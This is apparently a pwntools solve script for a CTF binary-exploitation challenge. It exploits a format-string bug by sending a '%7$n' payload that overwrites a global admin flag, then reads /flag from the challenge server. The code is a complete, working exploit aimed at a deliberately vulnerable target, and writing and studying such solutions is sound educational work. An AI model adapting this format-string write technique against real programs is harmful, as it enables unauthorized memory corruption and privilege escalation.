#!/usr/bin/env python3
"""
Manifest Destiny - H7CTF pwn challenge

Vulnerability: format string in feedback() -> printf(user_input)
Goal:         set the global `is_admin` (0x40407c) != 0, then "view manifest"
              to make view_manifest() open /flag.

The feedback buffer is the 6th printf vararg, so its second qword is the
7th vararg.  `AA%7$nAB` prints 2 characters and writes that count to the
pointer stored at vararg 7, which we set to 0x40407c (is_admin).

Usage:
    python3 solve.py                 # remote (default)
    python3 solve.py LOCAL           # run local binary with bundled libc
"""

import sys

# Capture argv BEFORE importing pwntools: importing pwn truncates sys.argv.
LOCAL = len(sys.argv) > 1 and sys.argv[1].upper() == "LOCAL"

from pwn import context, p64, process, remote

HOST = "pwn.h7tex.com"
PORT = 41949

IS_ADMIN = 0x40407C  # global int, set by main binary (no PIE)


def start():
    if LOCAL:
        context.log_level = "info"
        # Run against the bundled loader/libc so offsets match the target.
        return process(
            ["./ld-linux-x86-64.so.2", "--library-path", ".", "./manifest"]
        )
    context.log_level = "info"
    return remote(HOST, PORT)


def exploit(p):
    p.recvuntil(b"exit\n")            # main menu
    p.sendline(b"1")                  # leave feedback
    p.recvuntil(b"operators:\n")      # feedback prompt

    # 8-byte format prefix -> address lands exactly at vararg 7.
    # "AA" = 2 printed chars -> is_admin := 2 (nonzero).
    payload = b"AA%7$nAB" + p64(IS_ADMIN)
    p.sendline(payload)

    p.recvuntil(b"You said: ")
    p.recvuntil(b"\n")                # consume echoed feedback line
    p.recvuntil(b"exit\n")            # back at main menu

    p.sendline(b"2")                  # view manifest -> prints /flag
    return p.recvall(timeout=5)


def main():
    p = start()
    try:
        data = exploit(p)
        sys.stdout.write(data.decode(errors="replace"))
    finally:
        p.close()


if __name__ == "__main__":
    main()
